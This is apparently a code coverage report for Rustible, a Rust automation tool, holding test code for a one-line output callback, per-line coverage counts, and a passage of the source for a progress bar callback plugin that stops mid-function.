assert_eq!(callback.format_status(\u0026ok_result), \"OK\");\n\n        let changed_result = ModuleResult::changed(\"changed\");\n        assert_eq!(callback.format_status(\u0026changed_result), \"CHANGED\");\n\n        let failed_result = ModuleResult::failed(\"failed\");\n        assert_eq!(callback.format_status(\u0026failed_result), \"FAILED\");\n\n        let skipped_result = ModuleResult::skipped(\"skipped\");\n        assert_eq!(callback.format_status(\u0026skipped_result), \"SKIPPED\");\n    }\n\n    #[test]\n    fn test_colored_status() {\n        let config = OnelineConfig::new().with_colors();\n        let callback = OnelineCallback::with_config(config);\n\n        let ok_result = ModuleResult::ok(\"ok\");\n        let status = callback.format_status(\u0026ok_result);\n        assert!(status.contains(\"\\x1b[32m\")); // Green\n        assert!(status.contains(\"\\x1b[0m\")); // Reset\n    }\n\n    #[test]\n    fn test_host_stats() {\n        let callback = OnelineCallback::new();\n\n        // Simulate task completions\n        let ok = ModuleResult::ok(\"ok\");\n        let changed = ModuleResult::changed(\"changed\");\n        let failed = ModuleResult::failed(\"failed\");\n        let skipped = ModuleResult::skipped(\"skipped\");\n\n        callback.update_stats(\"host1\", \u0026ok);\n        callback.update_stats(\"host1\", \u0026changed);\n        callback.update_stats(\"host1\", \u0026failed);\n        callback.update_stats(\"host1\", \u0026skipped);\n\n        let stats = callback.host_stats.read();\n        let host_stats = stats.get(\"host1\").unwrap();\n\n        assert_eq!(host_stats.ok, 1);\n        assert_eq!(host_stats.changed, 1);\n        assert_eq!(host_stats.failed, 1);\n        assert_eq!(host_stats.skipped, 1);\n        assert!(host_stats.has_failures());\n    }\n\n    #[test]\n    fn test_config_builder() {\n        let config = OnelineConfig::new()\n            .with_task_name()\n            .with_timestamp()\n            .with_max_length(100)\n            .with_colors()\n            .with_separator(\" :: \")\n            .with_result_separator(\" -\u003e \")\n            .with_stderr()\n            .without_headers()\n            .without_recap();\n\n        assert!(config.show_task_name);\n        assert!(config.show_timestamp);\n        assert_eq!(config.max_message_length, 100);\n        assert!(config.use_colors);\n        assert_eq!(config.separator, \" :: \");\n        assert_eq!(config.result_separator, \" -\u003e \");\n        assert!(config.use_stderr);\n        assert!(!config.show_headers);\n        assert!(!config.show_recap);\n    }\n}\n","traces":[{"line":92,"address":[24359712,24359913,24359919],"length":1,"stats":{"Line":1}},{"line":98,"address":[24359725],"length":1,"stats":{"Line":1}},{"line":99,"address":[24359761],"length":1,"stats":{"Line":1}},{"line":109,"address":[24354784],"length":1,"stats":{"Line":1}},{"line":110,"address":[24354792],"length":1,"stats":{"Line":1}},{"line":114,"address":[24354640],"length":1,"stats":{"Line":1}},{"line":115,"address":[24354648],"length":1,"stats":{"Line":1}},{"line":116,"address":[24354652],"length":1,"stats":{"Line":1}},{"line":120,"address":[24354672],"length":1,"stats":{"Line":1}},{"line":121,"address":[24354680],"length":1,"stats":{"Line":1}},{"line":122,"address":[24354684],"length":1,"stats":{"Line":1}},{"line":126,"address":[24354704],"length":1,"stats":{"Line":1}},{"line":127,"address":[24354721],"length":1,"stats":{"Line":1}},{"line":128,"address":[24354725],"length":1,"stats":{"Line":1}},{"line":132,"address":[24354544],"length":1,"stats":{"Line":1}},{"line":133,"address":[24354552],"length":1,"stats":{"Line":1}},{"line":134,"address":[24354556],"length":1,"stats":{"Line":1}},{"line":138,"address":[24354576],"length":1,"stats":{"Line":1}},{"line":139,"address":[24354584],"length":1,"stats":{"Line":1}},{"line":140,"address":[24354588],"length":1,"stats":{"Line":1}},{"line":144,"address":[30756240,30756470],"length":1,"stats":{"Line":1}},{"line":145,"address":[30756295,30756354],"length":1,"stats":{"Line":2}},{"line":146,"address":[30756450],"length":1,"stats":{"Line":1}},{"line":150,"address":[30756732,30756496],"length":1,"stats":{"Line":1}},{"line":151,"address":[30756610,30756551],"length":1,"stats":{"Line":2}},{"line":152,"address":[30756712],"length":1,"stats":{"Line":1}},{"line":156,"address":[24354752],"length":1,"stats":{"Line":1}},{"line":157,"address":[24354760],"length":1,"stats":{"Line":1}},{"line":158,"address":[24354764],"length":1,"stats":{"Line":1}},{"line":162,"address":[24354608],"length":1,"stats":{"Line":1}},{"line":163,"address":[24354616],"length":1,"stats":{"Line":1}},{"line":164,"address":[24354620],"length":1,"stats":{"Line":1}},{"line":183,"address":[24358864],"length":1,"stats":{"Line":1}},{"line":184,"address":[24358888,24358949],"length":1,"stats":{"Line":2}},{"line":185,"address":[24358945,24358951,24358899],"length":1,"stats":{"Line":2}},{"line":186,"address":[24358927,24359143],"length":1,"stats":{"Line":2}},{"line":187,"address":[24359139,24358987,24359148],"length":1,"stats":{"Line":2}},{"line":188,"address":[24358974,24359111,24359082],"length":1,"stats":{"Line":3}},{"line":189,"address":[24359116,24359046,24359107],"length":1,"stats":{"Line":2}},{"line":191,"address":[24359084,24359079,24359019],"length":1,"stats":{"Line":2}},{"line":195,"address":[24358800],"length":1,"stats":{"Line":1}},{"line":196,"address":[24358810],"length":1,"stats":{"Line":1}},{"line":230,"address":[24358775,24358781,24358416],"length":1,"stats":{"Line":1}},{"line":232,"address":[24358438],"length":1,"stats":{"Line":1}},{"line":233,"address":[24358445,24358497],"length":1,"stats":{"Line":2}},{"line":234,"address":[24358525],"length":1,"stats":{"Line":1}},{"line":235,"address":[24358540],"length":1,"stats":{"Line":1}},{"line":236,"address":[24358636,24358574],"length":1,"stats":{"Line":2}},{"line":241,"address":[24355662,24355280],"length":1,"stats":{"Line":1}},{"line":244,"address":[24355386,24355334],"length":1,"stats":{"Line":2}},{"line":245,"address":[24355414],"length":1,"stats":{"Line":1}},{"line":246,"address":[24355429],"length":1,"stats":{"Line":1}},{"line":247,"address":[24355523,24355463],"length":1,"stats":{"Line":2}},{"line":252,"address":[24354976],"length":1,"stats":{"Line":0}},{"line":253,"address":[24355006],"length":1,"stats":{"Line":0}},{"line":255,"address":[24355033],"length":1,"stats":{"Line":0}},{"line":256,"address":[24355148],"length":1,"stats":{"Line":0}},{"line":258,"address":[24355039],"length":1,"stats":{"Line":0}},{"line":263,"address":[24354816],"length":1,"stats":{"Line":1}},{"line":264,"address":[24354831,24354858],"length":1,"stats":{"Line":2}},{"line":265,"address":[24354837],"length":1,"stats":{"Line":1}},{"line":266,"address":[24354865,24354918],"length":1,"stats":{"Line":2}},{"line":267,"address":[24354897],"length":1,"stats":{"Line":1}},{"line":268,"address":[24354964,24354941,24354889],"length":1,"stats":{"Line":3}},{"line":269,"address":[24354943],"length":1,"stats":{"Line":1}},{"line":271,"address":[24354920],"length":1,"stats":{"Line":1}},{"line":276,"address":[24356000],"length":1,"stats":{"Line":1}},{"line":277,"address":[24356059],"length":1,"stats":{"Line":1}},{"line":279,"address":[24356079],"length":1,"stats":{"Line":1}},{"line":280,"address":[24356113],"length":1,"stats":{"Line":1}},{"line":281,"address":[24356138],"length":1,"stats":{"Line":0}},{"line":282,"address":[24356269],"length":1,"stats":{"Line":1}},{"line":283,"address":[24356295],"length":1,"stats":{"Line":0}},{"line":284,"address":[24356280],"length":1,"stats":{"Line":1}},{"line":285,"address":[24356571],"length":1,"stats":{"Line":0}},{"line":287,"address":[24356433],"length":1,"stats":{"Line":1}},{"line":290,"address":[24356090],"length":1,"stats":{"Line":1}},{"line":295,"address":[24357936],"length":1,"stats":{"Line":1}},{"line":296,"address":[24358032,24357992],"length":1,"stats":{"Line":2}},{"line":297,"address":[24358107,24358053],"length":1,"stats":{"Line":2}},{"line":299,"address":[24358014],"length":1,"stats":{"Line":1}},{"line":304,"address":[24358272],"length":1,"stats":{"Line":1}},{"line":305,"address":[24358314],"length":1,"stats":{"Line":1}},{"line":306,"address":[24358319],"length":1,"stats":{"Line":1}},{"line":307,"address":[24358333],"length":1,"stats":{"Line":1}},{"line":310,"address":[24358378],"length":1,"stats":{"Line":1}},{"line":315,"address":[24357910,24357916,24356720],"length":1,"stats":{"Line":1}},{"line":316,"address":[24356763],"length":1,"stats":{"Line":1}},{"line":319,"address":[24356779],"length":1,"stats":{"Line":1}},{"line":320,"address":[24356812],"length":1,"stats":{"Line":0}},{"line":321,"address":[24356869],"length":1,"stats":{"Line":0}},{"line":325,"address":[24356790,24357001],"length":1,"stats":{"Line":2}},{"line":328,"address":[24357030],"length":1,"stats":{"Line":1}},{"line":329,"address":[24357069],"length":1,"stats":{"Line":1}},{"line":333,"address":[24357036,24357238],"length":1,"stats":{"Line":2}},{"line":334,"address":[24357280],"length":1,"stats":{"Line":1}},{"line":335,"address":[24357353],"length":1,"stats":{"Line":1}},{"line":337,"address":[24357418,24357560],"length":1,"stats":{"Line":2}},{"line":344,"address":[24355973,24355967,24355696],"length":1,"stats":{"Line":1}},{"line":345,"address":[24355755],"length":1,"stats":{"Line":1}},{"line":346,"address":[24355840,24355781],"length":1,"stats":{"Line":2}},{"line":347,"address":[24355913],"length":1,"stats":{"Line":1}},{"line":348,"address":[24355925],"length":1,"stats":{"Line":1}},{"line":353,"address":[24359936],"length":1,"stats":{"Line":0}},{"line":354,"address":[24359944],"length":1,"stats":{"Line":0}},{"line":359,"address":[24359296],"length":1,"stats":{"Line":0}},{"line":360,"address":[24359314],"length":1,"stats":{"Line":0}},{"line":361,"address":[24359341],"length":1,"stats":{"Line":0}},{"line":368,"address":[30741548,30741645,30741520,30741842,30742087,30741618],"length":1,"stats":{"Line":0}},{"line":369,"address":[30741598,30741707],"length":1,"stats":{"Line":0}},{"line":371,"address":[30741831],"length":1,"stats":{"Line":0}},{"line":372,"address":[30741863],"length":1,"stats":{"Line":0}},{"line":376,"address":[30738136,30740565,30738114,30737984,30739574,30738015,30740541,30738180,30738204],"length":1,"stats":{"Line":0}},{"line":377,"address":[30738106],"length":1,"stats":{"Line":0}},{"line":382,"address":[30738407,30738327,30738146,30738251],"length":1,"stats":{"Line":0}},{"line":385,"address":[30740604,30738333,30740592],"length":1,"stats":{"Line":0}},{"line":388,"address":[30738444],"length":1,"stats":{"Line":0}},{"line":391,"address":[30738523],"length":1,"stats":{"Line":0}},{"line":392,"address":[30738582,30738997],"length":1,"stats":{"Line":0}},{"line":397,"address":[30738538],"length":1,"stats":{"Line":0}},{"line":401,"address":[30739031],"length":1,"stats":{"Line":0}},{"line":402,"address":[30739075,30739148],"length":1,"stats":{"Line":0}},{"line":403,"address":[30739194,30739262],"length":1,"stats":{"Line":0}},{"line":405,"address":[30739461,30739269],"length":1,"stats":{"Line":0}},{"line":406,"address":[30739584,30739524],"length":1,"stats":{"Line":0}},{"line":407,"address":[30739735,30739673],"length":1,"stats":{"Line":0}},{"line":408,"address":[30739708],"length":1,"stats":{"Line":0}},{"line":409,"address":[30739764,30739699,30739793],"length":1,"stats":{"Line":0}},{"line":410,"address":[30739766],"length":1,"stats":{"Line":0}},{"line":412,"address":[30739737],"length":1,"stats":{"Line":0}},{"line":415,"address":[30740512,30739838],"length":1,"stats":{"Line":0}},{"line":431,"address":[30737392,30737420,30737505,30737593,30737478,30737862],"length":1,"stats":{"Line":0}},{"line":432,"address":[30737470],"length":1,"stats":{"Line":0}},{"line":433,"address":[30737526,30737632],"length":1,"stats":{"Line":0}},{"line":437,"address":[24342395],"length":1,"stats":{"Line":0}},{"line":441,"address":[24342541],"length":1,"stats":{"Line":0}},{"line":445,"address":[30740738,30740624,30740711,30740927,30740643,30740940],"length":1,"stats":{"Line":0}},{"line":447,"address":[30740690,30740788],"length":1,"stats":{"Line":0}},{"line":450,"address":[30740813],"length":1,"stats":{"Line":0}},{"line":451,"address":[30740899,30740834],"length":1,"stats":{"Line":0}},{"line":454,"address":[24342867],"length":1,"stats":{"Line":0}},{"line":455,"address":[30742206],"length":1,"stats":{"Line":0}},{"line":456,"address":[30742337,30742262],"length":1,"stats":{"Line":0}},{"line":460,"address":[24342728],"length":1,"stats":{"Line":0}},{"line":461,"address":[30741429,30741054,30741182],"length":1,"stats":{"Line":0}}],"covered":93,"coverable":145},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","progress.rs"],"content":"//! Progress Bar Callback Plugin for Rustible\n//!\n//! This callback plugin provides visual progress bars for playbook execution,\n//! showing overall playbook progress and current play/task status.\n//!\n//! # Features\n//!\n//! - Overall playbook progress bar with task counter\n//! - Current play progress bar with host tracking\n//! - Current task spinner with status updates\n//! - Graceful fallback for non-TTY environments\n//! - Respects NO_COLOR environment variable\n//! - Thread-safe for concurrent task execution\n//!\n//! # Example Output (TTY)\n//!\n//! ```text\n//! Playbook [site.yml]  15/30 tasks (50%)\n//! Play [webservers]  5/10 hosts (50%)\n//!  Installing nginx on web1...\n//! ```\n//!\n//! # Example Output (non-TTY/CI)\n//!\n//! ```text\n//! [PROGRESS] Playbook: site.yml - Starting (30 tasks)\n//! [PROGRESS] Play: webservers - 0/10 hosts\n//! [PROGRESS] Task: Install nginx (web1)\n//! [PROGRESS] Task: Install nginx - completed on web1 (ok)\n//! ```\n\nuse std::collections::{HashMap, HashSet};\nuse std::io::IsTerminal;\nuse std::sync::atomic::{AtomicBool, AtomicU64, Ordering};\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse indicatif::{MultiProgress, ProgressBar, ProgressStyle};\nuse parking_lot::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\n/// Configuration for the progress bar callback\n#[derive(Debug, Clone)]\npub struct ProgressConfig {\n    /// Whether to use colored output (overridden by NO_COLOR env var)\n    pub use_color: bool,\n    /// Template for the playbook progress bar\n    pub playbook_template: String,\n    /// Template for the play progress bar\n    pub play_template: String,\n    /// Template for the task spinner\n    pub task_template: String,\n    /// Spinner tick interval in milliseconds\n    pub spinner_tick_ms: u64,\n    /// Whether to show task spinners for each active task\n    pub show_task_spinners: bool,\n    /// Whether to show elapsed time\n    pub show_elapsed: bool,\n    /// Whether to show ETA (estimated time remaining)\n    pub show_eta: bool,\n    /// Maximum number of concurrent task spinners to display\n    pub max_task_spinners: usize,\n}\n\nimpl Default for ProgressConfig {\n    fn default() -\u003e Self {\n        Self {\n            use_color: true,\n            playbook_template: \"{spinner:.green} {prefix:.bold.white} {bar:40.cyan/blue} {pos}/{len} tasks ({percent}%) [{elapsed_precise}]\".to_string(),\n            play_template: \"{spinner:.yellow} {prefix:.bold.white} {bar:40.green/dim} {pos}/{len} hosts ({percent}%)\".to_string(),\n            task_template: \"{spinner:.cyan} {wide_msg}\".to_string(),\n            spinner_tick_ms: 80,\n            show_task_spinners: true,\n            show_elapsed: true,\n            show_eta: false,\n            max_task_spinners: 5,\n        }\n    }\n}\n\n// ============================================================================\n// Play and Task State Tracking\n// ============================================================================\n\n/// State for tracking play progress\n#[derive(Debug)]\n#[allow(dead_code)]\nstruct PlayState {\n    /// Play name\n    name: String,\n    /// Total number of hosts in this play\n    total_hosts: usize,\n    /// Hosts that have completed all tasks\n    completed_hosts: HashSet\u003cString\u003e,\n    /// Progress bar for this play\n    progress_bar: Option\u003cProgressBar\u003e,\n    /// Start time\n    start_time: Instant,\n}\n\n/// State for tracking task execution\n#[derive(Debug)]\n#[allow(dead_code)]\nstruct TaskState {\n    /// Task name\n    name: String,\n    /// Host this task is running on\n    host: String,\n    /// Spinner for this task\n    spinner: Option\u003cProgressBar\u003e,\n    /// Start time\n    start_time: Instant,\n}\n\n// ============================================================================\n// Progress Callback Implementation\n// ============================================================================\n\n/// Progress bar callback plugin for visual execution feedback.\n///\n/// This callback provides real-time progress visualization using the indicatif\n/// crate. It automatically detects TTY capabilities and falls back to simple\n/// text output for CI/CD environments.\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::ProgressCallback;\n///\n/// // Create with default configuration\n/// let callback = ProgressCallback::new();\n///\n/// // Create with custom configuration\n/// let config = ProgressConfig {\n///     show_task_spinners: false,\n///     ..Default::default()\n/// };\n/// let callback = ProgressCallback::with_config(config);\n///\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct ProgressCallback {\n    /// Configuration\n    config: ProgressConfig,\n    /// Whether we're running in a TTY\n    is_tty: AtomicBool,\n    /// Multi-progress container for managing multiple progress bars\n    multi_progress: Arc\u003cRwLock\u003cOption\u003cMultiProgress\u003e\u003e\u003e,\n    /// Current playbook name\n    playbook_name: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Playbook start time\n    playbook_start: RwLock\u003cOption\u003cInstant\u003e\u003e,\n    /// Total task count for the playbook (estimated)\n    total_tasks: AtomicU64,\n    /// Completed task count\n    completed_tasks: AtomicU64,\n    /// Playbook progress bar\n    playbook_bar: RwLock\u003cOption\u003cProgressBar\u003e\u003e,\n    /// Current play state\n    current_play: RwLock\u003cOption\u003cPlayState\u003e\u003e,\n    /// Active task states (keyed by \"task_name:host\")\n    active_tasks: RwLock\u003cHashMap\u003cString, TaskState\u003e\u003e,\n    /// Task counter for unique task identification\n    task_counter: AtomicU64,\n    /// Whether any failures occurred\n    has_failures: AtomicBool,\n    /// Host statistics for recap\n    host_stats: RwLock\u003cHashMap\u003cString, HostStats\u003e\u003e,\n}\n\n/// Per-host statistics\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    ok: u32,\n    changed: u32,\n    failed: u32,\n    skipped: u32,\n    unreachable: u32,\n}\n\nimpl ProgressCallback {\n    /// Create a new progress callback with default configuration.\n    pub fn new() -\u003e Self {\n        Self::with_config(ProgressConfig::default())\n    }\n\n    /// Create a new progress callback with custom configuration.\n    pub fn with_config(config: ProgressConfig) -\u003e Self {\n        // Check if stdout is a TTY\n        let is_tty = std::io::stdout().is_terminal();\n\n        // Respect NO_COLOR environment variable\n        let use_color = config.use_color \u0026\u0026 std::env::var(\"NO_COLOR\").is_err();\n\n        Self {\n            config: ProgressConfig {\n                use_color,\n                ..config\n            },\n            is_tty: AtomicBool::new(is_tty),\n            multi_progress: Arc::new(RwLock::new(None)),\n            playbook_name: RwLock::new(None),\n            playbook_start: RwLock::new(None),\n            total_tasks: AtomicU64::new(0),\n            completed_tasks: AtomicU64::new(0),\n            playbook_bar: RwLock::new(None),\n            current_play: RwLock::new(None),\n            active_tasks: RwLock::new(HashMap::new()),\n            task_counter: AtomicU64::new(0),\n            has_failures: AtomicBool::new(false),\n            host_stats: RwLock::new(HashMap::new()),\n        }\n    }\n\n    /// Check if we're in TTY mode\n    fn is_tty(\u0026self) -\u003e bool {\n        self.is_tty.load(Ordering::Relaxed)\n    }\n\n    /// Get or create the multi-progress container\n    fn get_multi_progress(\u0026self) -\u003e Option\u003cMultiProgress\u003e {\n        if !self.is_tty() {\n            return None;\n        }\n\n        let guard = self.multi_progress.read();\n        if guard.is_some() {\n            return guard.clone();\n        }\n        drop(guard);\n\n        let mut guard = self.multi_progress.write();\n        if guard.is_none() {\n            *guard = Some(MultiProgress::new());\n        }\n        guard.clone()\n    }\n\n    /// Create the playbook progress bar style\n    fn playbook_style(\u0026self) -\u003e ProgressStyle {\n        ProgressStyle::default_bar()\n            .template(\u0026self.config.playbook_template)\n            .unwrap_or_else(|_| ProgressStyle::default_bar())\n            .progress_chars(\"\")\n    }\n\n    /// Create the play progress bar style\n    fn play_style(\u0026self) -\u003e ProgressStyle {\n        ProgressStyle::default_bar()\n            .template(\u0026self.config.play_template)\n            .unwrap_or_else(|_| ProgressStyle::default_bar())\n            .progress_chars(\"\")\n    }\n\n    /// Create the task spinner style\n    fn task_style(\u0026self) -\u003e ProgressStyle {\n        ProgressStyle::default_spinner()\n            .template(\u0026self.config.task_template)\n            .unwrap_or_else(|_| ProgressStyle::default_spinner())\n    }\n\n    /// Create a task key for the active_tasks map\n    fn task_key(task_name: \u0026str, host: \u0026str) -\u003e String {\n        format!(\"{}:{}\", task_name, host)\n    }\n\n    /// Print non-TTY progress message\n    fn print_progress(\u0026self, message: \u0026str) {\n        if self.config.use_color {\n            println!(\"{} {}\", \"[PROGRESS]\".bright_blue().bold(), message);\n        } else {\n            println!(\"[PROGRESS] {}\", message);\n        }\n    }\n\n    /// Print non-TTY status message with status indicator\n    fn print_status(\u0026self, status: \u0026str, message: \u0026str) {\n        let status_colored = match status {\n            \"ok\" =\u003e {\n                if self.config.use_color {\n                    \"ok\".green().to_string()\n                } else {\n                    \"ok\".to_string()\n                }\n            }\n            \"changed\" =\u003e {\n                if self.config.use_color {\n                    \"changed\".yellow().to_string()\n                } else {\n                    \"changed\".to_string()\n                }\n            }\n            \"failed\" =\u003e {\n                if self.config.use_color {\n                    \"failed\".red().bold().to_string()\n                } else {\n                    \"failed\".to_string()\n                }\n            }\n            \"skipped\" =\u003e {\n                if self.config.use_color {\n                    \"skipped\".cyan().to_string()\n                } else {\n                    \"skipped\".to_string()\n                }\n            }\n            _ =\u003e status.to_string(),\n        };\n\n        if self.config.use_color {\n            println!(\n                \"{} {} - {}\",\n                \"[PROGRESS]\".bright_blue().bold(),\n                message,\n                status_colored\n            );\n        } else {\n            println!(\"[PROGRESS] {} - {}\", message, status_colored);\n        }\n    }\n\n    /// Format duration for display\n    fn format_duration(duration: Duration) -\u003e String {\n        let secs = duration.as_secs();\n        let millis = duration.subsec_millis();\n\n        if secs \u003e= 3600 {\n            let hours = secs / 3600;\n            let mins = (secs % 3600) / 60;\n            let secs = secs % 60;\n            format!(\"{}h {}m {}s\", hours, mins, secs)\n        } else if secs \u003e= 60 {\n            let mins = secs / 60;\n            let secs = secs % 60;\n            format!(\"{}m {}s\", mins, secs)\n        } else if secs \u003e 0 {\n            format!(\"{}.{:02}s\", secs, millis / 10)\n        } else {\n            format!(\"{}ms\", millis)\n        }\n    }\n\n    /// Finish all progress bars and show completion message\n    fn finish_all(\u0026self, success: bool) {\n        // Finish any active task spinners\n        let mut active = self.active_tasks.write();\n        for (_, state) in active.drain() {\n            if let Some(spinner) = state.spinner {\n                spinner.finish_and_clear();\n            }\n        }\n\n        // Finish play progress bar\n        if let Some(play_state) = self.current_play.write().take() {\n            if let Some(bar) = play_state.progress_bar {\n                bar.finish_and_clear();\n            }\n        }\n\n        // Finish playbook progress bar\n        if let Some(bar) = self.playbook_bar.write().take() {\n            let completed = self.completed_tasks.load(Ordering::Relaxed);\n            bar.set_position(completed);\n\n            if success {\n                bar.finish_with_message(\"completed\");\n            } else {\n                bar.finish_with_message(\"failed\");\n            }\n        }\n\n        // Clear multi-progress\n        *self.multi_progress.write() = None;\n    }\n\n    /// Print recap summary (non-TTY mode)\n    fn print_recap(\u0026self, playbook_name: \u0026str, success: bool) {\n        let stats = self.host_stats.read();\n        let start = self.playbook_start.read();\n\n        if !self.is_tty() {\n            println!();\n            if self.config.use_color {\n                println!(\n                    \"{} {}\",\n                    \"PLAY RECAP\".bright_white().bold(),\n                    \"*\".repeat(60).bright_black()\n                );\n            } else {\n                println!(\"PLAY RECAP {}\", \"*\".repeat(60));\n            }\n\n            // Sort hosts for consistent output\n            let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n            hosts.sort();\n\n            for host in hosts {\n                if let Some(host_stats) = stats.get(host) {\n                    if self.config.use_color {\n                        let host_colored = if host_stats.failed \u003e 0 || host_stats.unreachable \u003e 0 {\n                            host.red().bold()\n                        } else if host_stats.changed \u003e 0 {\n                            host.yellow()\n                        } else {\n                            host.green()\n                        };\n\n                        println!(\n                            \"{:\u003c30} : ok={} changed={} failed={} skipped={} unreachable={}\",\n                            host_colored,\n                            host_stats.ok.to_string().green(),\n                            host_stats.changed.to_string().yellow(),\n                            host_stats.failed.to_string().red(),\n                            host_stats.skipped.to_string().cyan(),\n                            host_stats.unreachable.to_string().magenta()\n                        );\n                    } else {\n                        println!(\n                            \"{:\u003c30} : ok={} changed={} failed={} skipped={} unreachable={}\",\n                            host,\n                            host_stats.ok,\n                            host_stats.changed,\n                            host_stats.failed,\n                            host_stats.skipped,\n                            host_stats.unreachable\n                        );\n                    }\n                }\n            }\n        }\n\n        // Print duration\n        if let Some(start_time) = *start {\n            let duration = start_time.elapsed();\n            let duration_str = Self::format_duration(duration);\n            let status = if success {\n                if self.config.use_color {\n                    \"completed\".green().bold().to_string()\n                } else {\n                    \"completed\".to_string()\n                }\n            } else {\n                if self.config.use_color {\n                    \"failed\".red().bold().to_string()\n                } else {\n                    \"failed\".to_string()\n                }\n            };\n\n            println!();\n            if self.config.use_color {\n                println!(\n                    \"Playbook {} {} in {}\",\n                    playbook_name.bright_white(),\n                    status,\n                    duration_str.bright_yellow()\n                );\n            } else {\n                println!(\"Playbook {} {} in {}\", playbook_name, status, duration_str);\n            }\n        }\n    }\n}\n\nimpl Default for ProgressCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for ProgressCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            is_tty: AtomicBool::new(self.is_tty.load(Ordering::Relaxed)),\n            multi_progress: Arc::new(RwLock::new(None)),\n            playbook_name: RwLock::new(self.playbook_name.read().clone()),\n            playbook_start: RwLock::new(*self.playbook_start.read()),\n            total_tasks: AtomicU64::new(self.total_tasks.load(Ordering::Relaxed)),\n            completed_tasks: AtomicU64::new(self.completed_tasks.load(Ordering::Relaxed)),\n            playbook_bar: RwLock::new(None),\n            current_play: RwLock::new(None),\n            active_tasks: RwLock::new(HashMap::new()),\n            task_counter: AtomicU64::new(self.task_counter.load(Ordering::Relaxed)),\n            has_failures: AtomicBool::new(self.has_failures.load(Ordering::Relaxed)),\n            host_stats: RwLock::new(self.host_stats.read().clone()),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for ProgressCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        // Reset state\n        *self.playbook_name.write() = Some(name.to_string());\n        *self.playbook_start.write() = Some(Instant::now());\n        self.total_tasks.store(0, Ordering::Relaxed);\n        self.completed_tasks.store(0, Ordering::Relaxed);\n        self.has_failures.store(false, Ordering::Relaxed);\n        self.host_stats.write().clear();\n        self.active_tasks.write().clear();\n        self.task_counter.store(0, Ordering::Relaxed);\n\n        if self.is_tty() {\n            // Create multi-progress and playbook progress bar\n            if let Some(mp) = self.get_multi_progress() {\n                let bar = mp.add(ProgressBar::new(100)); // Will be updated when we know task count\n                bar.set_style(self.playbook_style());\n                bar.set_prefix(format!(\"Playbook [{}]\", name));\n                bar.enable_steady_tick(Duration::from_millis(self.config.spinner_tick_ms));\n                *self.playbook_bar.write() = Some(bar);\n            }\n        } else {\n            self.print_progress(\u0026format!(\"Playbook: {} - Starting\", name));\n        }\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        self.finish_all(success);\n        self.print_recap(name, success);\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        // Initialize host stats for all hosts in this play\n        {\n            let mut stats = self.host_stats.write();\n            for host in hosts {\n                stats.entry(host.clone()).or_default();\n            }\n        }\n\n        // Finish previous play progress bar if any\n        if let Some(prev_play) = self.current_play.write().take() {\n            if let Some(bar) = prev_play.progress_bar {\n                bar.finish_and_clear();\n            }\n        }\n\n        if self.is_tty() {\n            // Create play progress bar\n            let bar = if let Some(mp) = self.get_multi_progress() {\n                let bar = mp.add(ProgressBar::new(hosts.len() as u64));\n                bar.set_style(self.play_style());\n                bar.set_prefix(format!(\"Play [{}]\", name));\n                bar.enable_steady_tick(Duration::from_millis(self.config.spinner_tick_ms));\n                Some(bar)\n            } else {\n                None\n            };\n\n            *self.current_play.write() = Some(PlayState {\n                name: name.to_string(),\n                total_hosts: hosts.len(),\n                completed_hosts: HashSet::new(),\n                progress_bar: bar,\n                start_time: Instant::now(),\n            });\n        } else {\n            self.print_progress(\u0026format!(\"Play: {} - 0/{} hosts\", name, hosts.len()));\n\n            *self.current_play.write() = Some(PlayState {\n                name: name.to_string(),\n                total_hosts: hosts.len(),\n                completed_hosts: HashSet::new(),\n                progress_bar: None,\n                start_time: Instant::now(),\n            });\n        }\n    }\n\n    async fn on_play_end(\u0026self, name: \u0026str, success: bool) {\n        if let Some(play_state) = self.current_play.write().take() {\n            if let Some(bar) = play_state.progress_bar {\n                if success {\n                    bar.finish_with_message(\"done\");\n                } else {\n                    bar.finish_with_message(\"failed\");\n                }\n            } else if !self.is_tty() {\n                let duration = play_state.start_time.elapsed();\n                let status = if success { \"completed\" } else { \"failed\" };\n                self.print_progress(\u0026format!(\n                    \"Play: {} - {} in {}\",\n                    name,\n                    status,\n                    Self::format_duration(duration)\n                ));\n            }\n        }\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        let _task_id = self.task_counter.fetch_add(1, Ordering::Relaxed);\n        let key = Self::task_key(name, host);\n\n        if self.is_tty() \u0026\u0026 self.config.show_task_spinners {\n            // Check if we're under the limit for task spinners\n            let active_count = self.active_tasks.read().len();\n\n            let spinner = if active_count \u003c self.config.max_task_spinners {\n                if let Some(mp) = self.get_multi_progress() {\n                    let spinner = mp.add(ProgressBar::new_spinner());\n                    spinner.set_style(self.task_style());\n                    spinner.set_message(format!(\"{} on {}...\", name, host));\n                    spinner.enable_steady_tick(Duration::from_millis(self.config.spinner_tick_ms));\n                    Some(spinner)\n                } else {\n                    None\n                }\n            } else {\n                None\n            };\n\n            self.active_tasks.write().insert(\n                key,\n                TaskState {\n                    name: name.to_string(),\n                    host: host.to_string(),\n                    spinner,\n                    start_time: Instant::now(),\n                },\n            );\n        } else if !self.is_tty() {\n            self.print_progress(\u0026format!(\"Task: {} ({})\", name, host));\n\n            self.active_tasks.write().insert(\n                key,\n                TaskState {\n                    name: name.to_string(),\n                    host: host.to_string(),\n                    spinner: None,\n                    start_time: Instant::now(),\n                },\n            );\n        }\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let key = Self::task_key(\u0026result.task_name, \u0026result.host);\n\n        // Increment completed tasks counter\n        let completed = 